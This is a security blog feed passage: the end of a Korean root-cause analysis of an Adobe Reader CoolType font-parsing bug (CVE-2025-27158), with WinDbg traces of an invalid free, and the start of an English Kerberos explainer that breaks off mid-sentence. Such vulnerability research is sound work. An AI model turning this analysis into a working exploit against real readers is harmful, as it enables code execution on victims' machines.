class="hljs-number">00000000</span> ecx=<span class="hljs-number">00000000</span> edx=<span class="hljs-number">052f</span>c380 esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e7d esp=<span class="hljs-number">052f</span>c4a0 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei ng nz na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000286</span>CoolType!CTGetVersion+<span class="hljs-number">0xb594d</span>:<span class="hljs-number">6</span>ee28e7d b900800000      mov     ecx,<span class="hljs-number">8000</span>h<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92BA:<span class="hljs-number">1</span>C08eax=<span class="hljs-number">00008000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00008000</span> edx=<span class="hljs-number">052f</span>c380 esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e82 esp=<span class="hljs-number">052f</span>c4a0 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei ng nz na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000286</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5952</span>:<span class="hljs-number">6</span>ee28e82 <span class="hljs-number">66894604</span>        mov     word ptr [esi+<span class="hljs-number">4</span>],ax      ds:<span class="hljs-number">002b</span>:<span class="hljs-number">0</span>a02b334=e0e0 &lt;-[<span class="hljs-number">13</span>][...]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92BA:<span class="hljs-number">1</span>C0Deax=<span class="hljs-number">00008000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00008000</span> edx=<span class="hljs-number">052f</span>c380 esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e95 esp=<span class="hljs-number">052f</span>c4b8 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl zr na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000246</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5965</span>:<span class="hljs-number">6</span>ee28e95 <span class="hljs-number">03</span>c0            add     eax,eax &lt;-[<span class="hljs-number">14</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92BA:<span class="hljs-number">1</span>C0Eeax=<span class="hljs-number">00010000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00008000</span> edx=<span class="hljs-number">052f</span>c380 esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e97 esp=<span class="hljs-number">052f</span>c4b8 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl nz na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000206</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5967</span>:<span class="hljs-number">6</span>ee28e97 <span class="hljs-number">50</span>              push    eax <span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92BA:<span class="hljs-number">1</span>C0Feax=<span class="hljs-number">00010000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00008000</span> edx=<span class="hljs-number">052f</span>c380 esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e98 esp=<span class="hljs-number">052f</span>c4b4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl nz na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000206</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5968</span>:<span class="hljs-number">6</span>ee28e98 e839cde4ff      call    CoolType!CTInit+<span class="hljs-number">0x2556</span> (<span class="hljs-number">6</span>ec75bd6) &lt;-[<span class="hljs-number">15</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92C1:<span class="hljs-number">108</span>eax=f2bca0c8 ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">6</span>ec75bfe edx=<span class="hljs-number">00000000</span> esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e9d esp=<span class="hljs-number">052f</span>c4b4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei ng nz na po nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000282</span>CoolType!CTGetVersion+<span class="hljs-number">0xb596d</span>:<span class="hljs-number">6</span>ee28e9d <span class="hljs-number">8365</span>ec00        <span class="hljs-keyword">and</span>     dword ptr [ebp<span class="hljs-number">-14</span>h],<span class="hljs-number">0</span> ss:<span class="hljs-number">002b</span>:<span class="hljs-number">052f</span>c4c8=f3a2e384<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; db f2bca0c8f2bca0c8  e0 e0 e0 e0 e0 e0 e0 e0-e0 e0 e0 e0 e0 e0 e0 e0  ................f2bca0d8  e0 e0 e0 e0 e0 e0 e0 e0-e0 e0 e0 e0 e0 e0 e0 e0  ................f2bca0e8  e0 e0 e0 e0 e0 e0 e0 e0-e0 e0 e0 e0 e0 e0 e0 e0  ................f2bca0f8  e0 e0 e0 e0 e0 e0 e0 e0-e0 e0 e0 e0 e0 e0 e0 e0  ................f2bca108  e0 e0 e0 e0 e0 e0 e0 e0-e0 e0 e0 e0 e0 e0 e0 e0  ................f2bca118  e0 e0 e0 e0 e0 e0 e0 e0-e0 e0 e0 e0 e0 e0 e0 e0  ................f2bca128  e0 e0 e0 e0 e0 e0 e0 e0-e0 e0 e0 e0 e0 e0 e0 e0  ................f2bca138  e0 e0 e0 e0 e0 e0 e0 e0-e0 e0 e0 e0 e0 e0 e0 e0  ................<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92C1:<span class="hljs-number">109</span>eax=f2bca0c8 ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">6</span>ec75bfe edx=<span class="hljs-number">00000000</span> esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28ea1 esp=<span class="hljs-number">052f</span>c4b4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl zr na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000246</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5971</span>:<span class="hljs-number">6</span>ee28ea1 <span class="hljs-number">894608</span>          mov     dword ptr [esi+<span class="hljs-number">8</span>],eax ds:<span class="hljs-number">002b</span>:<span class="hljs-number">0</span>a02b338=e0e0e0e0 &lt;-[<span class="hljs-number">16</span>][...]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92C1:<span class="hljs-number">10F</span>eax=<span class="hljs-number">00000000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00010000</span> edx=<span class="hljs-number">00000000</span> esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28eb0 esp=<span class="hljs-number">052f</span>c4b8 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         ov up ei ng nz na pe cycs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000</span>a87CoolType!CTGetVersion+<span class="hljs-number">0xb5980</span>:<span class="hljs-number">6</span>ee28eb0 <span class="hljs-number">57</span>              push    edi          &lt;-[<span class="hljs-number">17</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92C1:<span class="hljs-number">110</span>eax=<span class="hljs-number">00000000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00010000</span> edx=<span class="hljs-number">00000000</span> esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28eb1 esp=<span class="hljs-number">052f</span>c4b4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         ov up ei ng nz na pe cycs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000</span>a87CoolType!CTGetVersion+<span class="hljs-number">0xb5981</span>:<span class="hljs-number">6</span>ee28eb1 e8ad3de6ff      call    CoolType!CTInit+<span class="hljs-number">0x195e3</span> (<span class="hljs-number">6</span>ec8cc63)<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92C1:<span class="hljs-number">12</span>Aeax=<span class="hljs-number">00000000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00000000</span> edx=<span class="hljs-number">00000000</span> esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28eb6 esp=<span class="hljs-number">052f</span>c4b4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl zr na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000246</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5986</span>:<span class="hljs-number">6</span>ee28eb6 <span class="hljs-number">59</span>              pop     ecx<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; uCoolType!CTGetVersion+<span class="hljs-number">0xb5986</span>:<span class="hljs-number">6</span>ee28eb6 <span class="hljs-number">59</span>              pop     ecx<span class="hljs-number">6</span>ee28eb7 <span class="hljs-number">0f</span>b7d0          movzx   edx,ax<span class="hljs-number">6</span>ee28eba <span class="hljs-number">8b</span>4608          mov     eax,dword ptr [esi+<span class="hljs-number">8</span>]<span class="hljs-number">6</span>ee28ebd <span class="hljs-number">0f</span>b7cb          movzx   ecx,bx<span class="hljs-number">6</span>ee28ec0 <span class="hljs-number">43</span>              inc     ebx<span class="hljs-number">6</span>ee28ec1 <span class="hljs-number">66891448</span>        mov     word ptr [eax+ecx*<span class="hljs-number">2</span>],dx<span class="hljs-number">6</span>ee28ec5 <span class="hljs-number">663b</span>5e04        cmp     bx,word ptr [esi+<span class="hljs-number">4</span>]<span class="hljs-number">6</span>ee28ec9 <span class="hljs-number">72e5</span>            jb      CoolType!CTGetVersion+<span class="hljs-number">0xb5980</span> (<span class="hljs-number">6</span>ee28eb0) &lt;-[<span class="hljs-number">18</span>]</code></pre><p>[8], [10], [12]&#xC5D0;&#xC11C; &#xAC01;&#xAC01; <strong>itemCount, shortDeltaCount, regionIndexCount</strong> &#xAC12;&#xC744; &#xC77D;&#xC5B4;&#xC640; [9], [11], [13]&#xC744; &#xD1B5;&#xD574; 0a02b330, 0a02b330+2, 0a02b330+4 &#xC8FC;&#xC18C;&#xC5D0; write &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC704; &#xC138; &#xAC00;&#xC9C0; &#xAC12;&#xC740; &#xCCAB; &#xBC88;&#xC9F8; &#xD558;&#xC704; &#xD14C;&#xC774;&#xBE14;&#xC758; &#xC815;&#xBCF4;&#xB97C; &#xB098;&#xD0C0;&#xB0B4;&#xBA70;, &#xD2B9;&#xD788; regionIndexCount&#xC740; regionIndexes &#xBC30;&#xC5F4;&#xC758; &#xD06C;&#xAE30;&#xB97C; &#xACB0;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p><p>[14]&#xC5D0;&#xC11C; regionIndexCount &#xAC12;(0x8000)&#xC744; &#xD1B5;&#xD574; &#xBC84;&#xD37C; &#xD06C;&#xAE30;(0x10000)&#xB97C; &#xACC4;&#xC0B0;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; [15]&#xC5D0;&#xC11C; <code>CoolType!CTInit+0x2556</code>&#xC744; &#xD638;&#xCD9C;&#xD574; regionIndexes &#xBC84;&#xD37C;&#xB97C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;. </p><p>[16]&#xC5D0;&#xC11C; &#xD560;&#xB2F9;&#xB41C; regionIndexes &#xBC84;&#xD37C;&#xC758; &#xD3EC;&#xC778;&#xD130;(0xf2bca0c8)&#xB97C; [4]&#xC5D0;&#xC11C; &#xD560;&#xB2F9;&#xD55C; &#xBC84;&#xD37C;(0a02b330+8)&#xC5D0; &#xAE30;&#xB85D;&#xD569;&#xB2C8;&#xB2E4;.</p><p>[17]&#xC5D0;&#xC11C; &#xC2DC;&#xC791;&#xD574; [18]&#xC5D0;&#xC11C; &#xB05D;&#xB098;&#xB294; &#xB8E8;&#xD504;&#xB294; &#xCCAB; &#xBC88;&#xC9F8; itemVariationData &#xD558;&#xC704; &#xD14C;&#xC774;&#xBE14; regionIndex&#xB97C; &#xD1B5;&#xD574; &#xD574;&#xB2F9; &#xAC12;&#xC744; regionIndexes &#xBC84;&#xD37C;&#xC5D0; write &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB54C;, &#xD30C;&#xC77C; &#xB370;&#xC774;&#xD130;&#xAC00; &#xBD80;&#xC871;&#xD574; regionIndexes &#xB370;&#xC774;&#xD130;&#xB97C; &#xBAA8;&#xB450; &#xC77D;&#xC9C0; &#xBABB;&#xD558;&#xBA74; &#xD560;&#xB2F9;&#xB41C; &#xBAA8;&#xB4E0; &#xBC84;&#xD37C;&#xB97C; &#xD574;&#xC81C;&#xD558;&#xB824;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs cpp"><span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; gTime Travel Position: E9353:<span class="hljs-number">6</span>Deax=<span class="hljs-number">00000000</span> ebx=<span class="hljs-number">00000000</span> ecx=f3a36e40 edx=<span class="hljs-number">09</span>cf0000 esi=f3a2a970 edi=<span class="hljs-number">00000000</span>eip=<span class="hljs-number">6</span>ee279d9 esp=<span class="hljs-number">052f</span>c1d8 ebp=<span class="hljs-number">052f</span>c1e4 iopl=<span class="hljs-number">0</span>         nv up ei pl zr na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000246</span>CoolType!CTGetVersion+<span class="hljs-number">0xb44a9</span>:<span class="hljs-number">6</span>ee279d9 <span class="hljs-number">8b</span>863c020000    mov     eax,dword ptr [esi+<span class="hljs-number">23</span>Ch] ds:<span class="hljs-number">002b</span>:f3a2abac=<span class="hljs-number">0</span>a02b330<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; tTime Travel Position: E9353:<span class="hljs-number">6</span>Eeax=<span class="hljs-number">0</span>a02b330 ebx=<span class="hljs-number">00000000</span> ecx=f3a36e40 edx=<span class="hljs-number">09</span>cf0000 esi=f3a2a970 edi=<span class="hljs-number">00000000</span>eip=<span class="hljs-number">6</span>ee279df esp=<span class="hljs-number">052f</span>c1d8 ebp=<span class="hljs-number">052f</span>c1e4 iopl=<span class="hljs-number">0</span>         nv up ei pl zr na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000246</span>CoolType!CTGetVersion+<span class="hljs-number">0xb44af</span>:<span class="hljs-number">6</span>ee279df ff740708        push    dword ptr [edi+eax+<span class="hljs-number">8</span>] ds:<span class="hljs-number">002b</span>:<span class="hljs-number">0</span>a02b338=f2bca0c8 &lt;-[<span class="hljs-number">19</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; dd <span class="hljs-number">0</span>a02b330<span class="hljs-number">0</span>a02b330  <span class="hljs-number">00000000</span> e0e08000 f2bca0c8 e0e0e0e0<span class="hljs-number">0</span>a02b340  e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E9353:<span class="hljs-number">6F</span>eax=<span class="hljs-number">0</span>a02b330 ebx=<span class="hljs-number">00000000</span> ecx=f3a36e40 edx=<span class="hljs-number">09</span>cf0000 esi=f3a2a970 edi=<span class="hljs-number">00000000</span>eip=<span class="hljs-number">6</span>ee279e3 esp=<span class="hljs-number">052f</span>c1d4 ebp=<span class="hljs-number">052f</span>c1e4 iopl=<span class="hljs-number">0</span>         nv up ei pl zr na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000246</span>CoolType!CTGetVersion+<span class="hljs-number">0xb44b3</span>:<span class="hljs-number">6</span>ee279e3 e82a4ce5ff      call    CoolType!CTInit+<span class="hljs-number">0x8f92</span> (<span class="hljs-number">6</span>ec7c612) &lt;-[<span class="hljs-number">20</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E935D:<span class="hljs-number">2382</span>eax=<span class="hljs-number">00000001</span> ebx=<span class="hljs-number">00000000</span> ecx=f2bca0c8 edx=<span class="hljs-number">09</span>cf0000 esi=f3a2a970 edi=<span class="hljs-number">00000000</span>eip=<span class="hljs-number">6</span>ee279e8 esp=<span class="hljs-number">052f</span>c1d4 ebp=<span class="hljs-number">052f</span>c1e4 iopl=<span class="hljs-number">0</span>         nv up ei pl nz na po nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000202</span>CoolType!CTGetVersion+<span class="hljs-number">0xb44b8</span>:<span class="hljs-number">6</span>ee279e8 <span class="hljs-number">0f</span>b78638020000  movzx   eax,word ptr [esi+<span class="hljs-number">238</span>h]  ds:<span class="hljs-number">002b</span>:f3a2aba8=<span class="hljs-number">0002</span><span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; dd f2bca0c8  &lt;-[<span class="hljs-number">21</span>]f2bca0c8  f0f0f0f0 f0f0f0f0 f0f0f0f0 f0f0f0f0f2bca0d8  f0f0f0f0 f0f0f0f0 f0f0f0f0 f0f0f0f0f2bca0e8  f0f0f0f0 f0f0f0f0 f0f0f0f0 f0f0f0f0f2bca0f8  f0f0f0f0 f0f0f0f0 f0f0f0f0 f0f0f0f0f2bca108  f0f0f0f0 f0f0f0f0 f0f0f0f0 f0f0f0f0f2bca118  f0f0f0f0 f0f0f0f0 f0f0f0f0 f0f0f0f0f2bca128  f0f0f0f0 f0f0f0f0 f0f0f0f0 f0f0f0f0f2bca138  f0f0f0f0 f0f0f0f0 f0f0f0f0 f0f0f0f0[...]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; tTime Travel Position: E935D:<span class="hljs-number">2389</span>eax=<span class="hljs-number">0</span>a02b330 ebx=<span class="hljs-number">00000001</span> ecx=f2bca0c8 edx=<span class="hljs-number">09</span>cf0000 esi=f3a2a970 edi=<span class="hljs-number">00000010</span>eip=<span class="hljs-number">6</span>ee279df esp=<span class="hljs-number">052f</span>c1d8 ebp=<span class="hljs-number">052f</span>c1e4 iopl=<span class="hljs-number">0</span>         nv up ei ng nz ac pe cycs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000297</span>CoolType!CTGetVersion+<span class="hljs-number">0xb44af</span>:<span class="hljs-number">6</span>ee279df ff740708        push    dword ptr [edi+eax+<span class="hljs-number">8</span>] ds:<span class="hljs-number">002b</span>:<span class="hljs-number">0</span>a02b348=e0e0e0e0  &lt;-[<span class="hljs-number">22</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; t Time Travel Position: E935D:<span class="hljs-number">238</span>Aeax=<span class="hljs-number">0</span>a02b330 ebx=<span class="hljs-number">00000001</span> ecx=f2bca0c8 edx=<span class="hljs-number">09</span>cf0000 esi=f3a2a970 edi=<span class="hljs-number">00000010</span>eip=<span class="hljs-number">6</span>ee279e3 esp=<span class="hljs-number">052f</span>c1d4 ebp=<span class="hljs-number">052f</span>c1e4 iopl=<span class="hljs-number">0</span>         nv up ei ng nz ac pe cycs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000297</span>CoolType!CTGetVersion+<span class="hljs-number">0xb44b3</span>:<span class="hljs-number">6</span>ee279e3 e82a4ce5ff      call    CoolType!CTInit+<span class="hljs-number">0x8f92</span> (<span class="hljs-number">6</span>ec7c612) &lt;-[<span class="hljs-number">23</span>]</code></pre><p>[19]&#xC5D0;&#xC11C; &#xCCAB; &#xBC88;&#xC9F8; regionIndexes &#xBC84;&#xD37C;&#xC758; &#xC8FC;&#xC18C;(0xf2bca0c8)&#xB97C; &#xC2A4;&#xD0DD;&#xC5D0; push &#xD569;&#xB2C8;&#xB2E4;.</p><p>[20]&#xC5D0;&#xC11C; <code>CoolType!CTInit+0x8f92</code>&#xB97C; &#xD638;&#xCD9C;&#xD574; &#xCCAB; &#xBC88;&#xC9F8; &#xBC84;&#xD37C;&#xB97C; &#xD574;&#xC81C;&#xD569;&#xB2C8;&#xB2E4;.</p><p>[22]&#xC5D0;&#xC11C; &#xB450; &#xBC88;&#xC9F8; &#xD558;&#xC704; &#xD14C;&#xC774;&#xBE14;&#xC758; regionIndexes &#xBC84;&#xD37C; &#xC8FC;&#xC18C;&#xB97C; push &#xD558;&#xB824; &#xD558;&#xC9C0;&#xB9CC;, &#xD560;&#xB2F9;&#xC774; &#xC548;&#xB418;&#xC5C8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB354;&#xBBF8; &#xB370;&#xC774;&#xD130;(0xe0e0e0e0)&#xB97C; push &#xD574; [23] &#xC2E4;&#xD589; &#xC2DC; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C;, &#xACF5;&#xACA9;&#xC790;&#xB294; [4]&#xC5D0;&#xC11C; &#xD560;&#xB2F9;&#xB41C; &#xBC84;&#xD37C;(0x0a02b330)&#xB97C; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA74; &#xC784;&#xC758;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/ogu123/">ogu123</category>
      
      <category domain="https://hackyboiz.github.io/tags/Adobe-Acrobat-Reader/">Adobe Acrobat Reader</category>
      
      <category domain="https://hackyboiz.github.io/tags/Memory-Corruption/">Memory Corruption</category>
      
      <category domain="https://hackyboiz.github.io/tags/OTF/">OTF</category>
      
      <category domain="https://hackyboiz.github.io/tags/CFF2/">CFF2</category>
      
      
      <comments>https://hackyboiz.github.io/2025/04/23/ogu123/cve-2025-27158/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Windows Authentication Series (Part2. Kerberos)(EN)</title>
      <link>https://hackyboiz.github.io/2025/04/21/mungsul/NTLM_Part2/en/</link>
      <guid>https://hackyboiz.github.io/2025/04/21/mungsul/NTLM_Part2/en/</guid>
      <pubDate>Mon, 21 Apr 2025 14:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;hello. Welcome back to the Win</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>hello. Welcome back to the Windows Authentication Series. In Part 1 NTLM, I said that we would look at NTLM-related CVEs in Part 2. While it&#x2019;s good to cover NTLM-related CVEs, I thought it would be a good idea to cover the Kerberos authentication protocol, which is mainly used in Windows, first.</p><p>In this article, I&#x2019;ll show you how Kerberos works, how it&#x2019;s implemented in the Windows environment, and analyze some Kerberos-related attacks and CVE vulnerabilities.</p><h1 id="Kerberos-Authentication"><a href="#Kerberos-Authentication" class="headerlink" title="Kerberos Authentication"></a>Kerberos Authentication</h1><p>Kerberos is a ticket-based authentication protocol that allows users and services to authenticate each other without exposing the passwords themselves to the network by issuing tickets based on symmetric key cryptography through a KDC.</p><p>This authentication structure features the following elements</p><ul><li>Key Distribution Center (KDC): The key distribution center, a composite of the AS and TGS, provides authentication services and generates and distributes session keys.</li><li>AS (Authentication Server): Authentication server, performs client authentication and issues TGTs to clients encrypted with the TGS&#x2019;s secret key.</li><li>Ticket Granting Server (TGS): A ticket granting server that issues STs and session keys when a client sends a TGT to the TGS.</li><li>TGT (Ticket Granting Ticket): A ticket granting ticket, which allows a ticket to be issued by the TGS.</li><li>ST (Service Ticket): A ticket that allows you to use a service.</li><li>SS (Service Server): The server that provides the service.</li></ul><p>The Kerberos authentication process can be summarized as follows:</p><ol><li>The client makes an authentication request to the AS.</li><li>the AS issues a TGT to the client.<ol><li>The TGT is encrypted with the secret key of the TGS.</li><li>the AS and TGS typically share the same host as the KDC.</li></ol></li><li>The client communicates the TGT and the ID of the service to be requested to the TGS.</li><li>the TGS issues an ST to the client.<br>The service the client is requesting access to must be registered with the TGS with a Service Principal Name (SPN).</li><li>The client forwards the ST to the server.</li><li>Perform the communication.</li></ol><p>The above process is schematized in the following figure.</p><p><img src="/2025/04/21/mungsul/NTLM_Part2/en/1.png" alt></p><h2 id="Kerberos-authentication-on-Windows"><a href="#Kerberos-authentication-on-Windows" class="headerlink" title="Kerberos authentication on Windows"></a>Kerberos authentication on Windows</h2><p>In the Windows Kerberos implementation, tickets include something called a Privilege Attribute Certificate (PAC). The PAC contains the user&#x2019;s group information and authorization data, among other things. The KDC signs this information to issue the ticket. When a ticket comes in, the service server looks at the PAC, checks the permissions, and either grants or denies access.</p><p>Now, in Windows, the Kerberos authentication process outlined above looks like this:</p><p>It&#x2019;s a bit of a headache, but let&#x2019;s go through it one by one.</p><p><img src="/2025/04/21/mungsul/NTLM_Part2/en/2.png" alt></p><p><strong>1) AS-REQ</strong></p><p>In an AS-REQ, the client requests a ticket with its identity from the KDC&#x2019;s authentication service. By Windows default, with preauthentication, the user sends the current time encrypted with their secret key (NTLM hash). The KDC decrypts this with the user&#x2019;s NTLM hash, which is stored in the domain controller (DC), to authenticate the user.</p><p><strong>2) AS-REP</strong> </p><p>If the verification in AS-REQ is successful, the client is issued a TGT and a session key (client-TGS) in the AS-REP response. The session key is encrypted with the user&#x2019;s NTLM hash, and the TGT is encrypted with the KDC&#x2019;s master key (the NTLM hash of the krbtgt account), so the client cannot decrypt the TGT.</p><p><strong>3) TGS-REQ</strong> </p><p>When a client needs access to a service server, it sends the TGT in a TGS-REQ message to the TGS in the KDC. The request also includes the SPN of the target service and the previously issued client-TGS session key.</p><p><strong>4) TGS-REP</strong></p><p>The KDC receives the TGS-REQ and verifies that the TGT is valid. The TGT is encrypted with the KDC&#x2019;s master key, so the KDC can decrypt it and verify it.</p><p>And if the user is authorized to access the requested service and there are no problems, it sends a TGS-REP response to the client.</p><p>This includes a session key 